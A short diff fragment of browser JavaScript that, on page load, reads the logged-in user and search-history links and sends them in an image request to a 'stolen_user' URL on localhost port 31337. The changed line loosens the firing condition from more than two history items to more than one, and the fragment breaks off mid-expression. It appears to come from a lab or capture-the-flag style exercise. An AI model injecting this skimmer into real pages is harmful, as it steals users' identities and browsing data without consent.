@@ -2,7 +2,7 @@
 window.onload = function () {
   var user = document.querySelector('#logged-in-user');
   var items = document.querySelectorAll('a.history-item');
-  if (user && items.length > 2) {
+  if (user && items.length > 1) {
     var lastSearch = items[1].textContent.trim();
     new Image().src =
       'http://localhost:31337/?stolen_user=' +
